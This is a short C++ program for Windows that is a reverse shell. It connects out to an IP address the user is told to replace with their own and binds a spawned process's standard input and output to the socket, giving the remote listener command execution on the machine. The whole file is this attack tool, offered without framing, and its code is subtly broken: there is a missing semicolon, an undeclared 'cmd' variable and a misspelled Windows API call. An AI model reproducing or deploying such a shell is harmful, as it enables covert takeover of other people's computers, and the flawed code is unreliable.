#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#define PORT 80
#include <WinSock2.h>
#include <iostream>
#include <tchar.h>
#pragma comment(lib, "ws2_32.lib")

using namespace std;

int main(){
    WSADATA real;
    char data[512];
    STARTUPINFO m;
    PROCESS_INFORMATION p;
    int start = WSAStartup(MAKEWORD(2, 2), &real);
    if(start != 0){
        cout << "Couldn't start client." << endl;
        Sleep(5000);
        exit(0);
    } else {
        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(s == INVALID_SOCKET){
            cout << "Couldn't create client." << endl;
            Sleep(5000);
            exit(0);
        } else {
            SOCKADDR_IN client;
            client.sin_family = AF_INET;
            client.sin_port = htons(PORT);
            client.sin_addr.s_addr = inet_addr("8.8.8.8") // Replace with your IP
            if(connect(s, (SOCKADDR*)&client, sizeof(client)) != 0){
                cout << "Couldn't connect to host." << endl;
                Sleep(5000);
                exit(0);
            } else {
                memset(data, 0, sizeof(data));
                m.cb = sizeof(m);
                m.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                m.hStdInput = m.hStdOutput = m.hStdError = (HANDLE)s;
                CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &m, &p);
                WaitForSingleObjects(p.hProcess, INFINITE);
                CloseHandle(p.hProcess);
                CloseHandle(p.hThread);
                memset(data, 0, sizeof(data));
                recv(s, data, sizeof(data), 0);
            }
        }
        closesocket(s);
        WSACleanup();
    }
    return 0;
}
